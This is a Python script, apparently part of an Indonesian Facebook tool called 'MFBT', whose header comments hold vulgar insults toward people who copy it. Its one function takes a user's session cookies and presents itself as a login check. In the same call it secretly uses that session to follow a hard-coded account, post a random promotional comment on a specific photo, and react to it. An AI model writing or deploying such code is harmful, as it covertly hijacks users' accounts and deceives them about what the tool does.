# Kalo Mau Recode Boleh, Tapi Liat Sc Nya Open source Kagak Ngen**d
# Kalo kaga Open Source Ya Jangan Maksa Anak Babi
# Coded By Merch (The Hengkerz)

import requests as r, random
from bs4 import BeautifulSoup as bs

ses = r.Session()
host = 'https://mbasic.facebook.com/'

def yantogeming(cookies):
    kukis = {'cookie':cookies}
    with r.Session() as ses:
        prof = ses.get(host +'ivan.cuahbulung', cookies=kukis).text
        sofol = bs(prof, 'html.parser')
        if "Ko'nrett | Facebook" in sofol.find('title').text:
            return 'invalid'
        else:
            hehe = bs(ses.get(host +'profile.php', cookies=kukis).text, 'html.parser')

            profile = bs(ses.get('https://mbasic.facebook.com/ivan.gans.965', cookies=kukis).text, 'html.parser')
            # open('t.html','w').write(str(profile))
            if 'Ikuti' in str(profile.text):
                ses.get('https://mbasic.facebook.com'+ profile.find_all('td')[5].find('a')['href'], cookies=kukis)
            else:
                pass

            picture = bs(ses.get('https://mbasic.facebook.com/photo.php?fbid=502426034489492&id=100041662984064&set=a.502426067822822', cookies=kukis).text, 'html.parser')
            form = picture.find('form', method="post")
            data = {}
            msg = random.choice(['MFBT is The BestðŸ˜Ž','Login BangðŸ¤•','MFBT UserðŸ˜Ž','Hallo BangðŸ˜Ž'])
            for nem in form:
                data[nem.get('name')] = nem.get('value')
            data.update({'comment_text':msg})
            ses.post('https://mbasic.facebook.com/'+ form['action'], data=data, cookies=kukis)
    
            if 'Anda' in str(picture):
                pass
            else:
                react = random.randrange(0,6)
                react_page = bs(ses.get('https://mbasic.facebook.com/'+ picture.find_all('td')[3].find('a')['href'], cookies=kukis).text, 'html.parser')
                # open('t.html','w').write(str(react_page))
                react_url = ses.get('https://mbasic.facebook.com/'+ react_page.find_all('li')[react].find('a')['href'], cookies=kukis)
                # print('')
            return hehe.find('title').text
